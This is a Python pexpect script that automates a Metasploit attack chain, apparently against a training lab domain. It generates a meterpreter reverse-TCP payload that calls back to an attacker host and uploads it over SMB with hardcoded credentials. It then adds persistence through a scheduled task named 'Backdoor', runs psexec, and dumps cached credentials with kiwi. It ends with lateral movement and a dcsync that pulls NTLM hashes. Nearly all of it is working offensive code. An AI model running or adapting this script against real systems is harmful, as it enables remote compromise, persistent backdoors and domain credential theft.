#!/usr/bin/python3
import pexpect
import os

#Testing logging and child.after for reference. Attempt on laptop with faster external drives for hyper-v

print ("INITIALISING")
print ("WELCOME")

#msfvenom
process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
process.expect('Final')
print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")

# Start Metasploit
child = pexpect.spawn('msfconsole', encoding='utf-8')
fout = open('Metascript_logs.txt','wb')
child.logfile = fout

# Wait for Metasploit prompt
child.expect('msf6')
print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print ("RUNNING WMIEXEC")
# Running resource1.rc
child.sendline('resource resource1.rc')
print (child.read)
child.expect('auxiliary', timeout=120)
print ("WMIEXEC COMPLETED - SUCCESS")
print (child.after)

print ("BEGINNING SMBCLIENT")
#SMB client put shell.exe
child.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
child.expect('password')
print ("ENTERING PASSWORD")
child.sendline('Password!')
child.expect('smb')

print ("PUTTING SHELL.EXE")
print (child.after)

child.sendline('put shell.exe')
child.expect('smb')

print ("COMPLETE - EXITING")
print (child.after)

child.sendline('exit')
child.expect('auxiliary')

print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
print (child.after)


print ("BEGINNING MULTI HANDLER")
# Running resource2.rc
child.sendline('resource resource2.rc')
child.expect_exact('meterpreter', timeout=999)

print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
print (child.after)

print ("METERPRETER SHELL TO BACKGROUND")
child.sendline('background')
child.expect('auxiliary')

print ("BACKGROUND SUCCESS")
print (child.after)


print ("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
child.sendline('resource resource3.rc')
child.expect('meterpreter', timeout=120)

print ("SUCCESS - REQUESTING SHELL")
print (child.after)

child.sendline('shell')
child.expect('C:\\ ', timeout=120)

print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
print (child.after)

child.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
child.expect('C:\\ ')

print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
print (child.after)

child.sendline('exit')
child.expect('meterpreter')

print (child.after)

child.sendline('exit')
child.expect('exploit')

print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
print (child.after)


print (" BEGINNING PSEXEC")
# Running resource4.rc
child.sendline('resource resource4.rc')
child.expect('meterpreter')

print ("PSEXEC COMPLETED - ATTACK SUCCESS")
print (child.after)

print ("STARTING KIWI")
child.sendline('load kiwi')
child.expect('meterpreter')

child.sendline('kiwi_cmd lsadump::cache')
child.expect('meterpreter')

print ("CACHE DUMP SUCCESS - EXITING KIWI")
print (child.after)

child.sendline('exit')
child.expect('exploit')

print (child.after)


print ("STARTING LATERAL MOVEMENT")
# Running resource5.rc
child.sendline('resource resource5.rc')
child.expect('meterpreter')
print (child.after)

print ("REQUESTING SYSINFO")
child.sendline('sysinfo')
child.expect('meterpreter')
print (child.after)


print ("SUCCESS - ENTERING SHELL")
child.sendline('shell')
child.expect('system32')
print (child.after)


print ("SHELL ESTABLISHED - REQUESTING USERS")
child.sendline('net users')
child.expect('system32')
print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
print (child.after)


child.sendline('exit')
child.expect('meterpreter')
child.sendline('load kiwi')
child.expect('meterpreter')
print (child.after)

print ("KIWI LOADED - TESTING DCSYNC")
child.sendline('dcsync_ntlm cdanvers')
child.expect('meterpreter')

print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")


child.close()
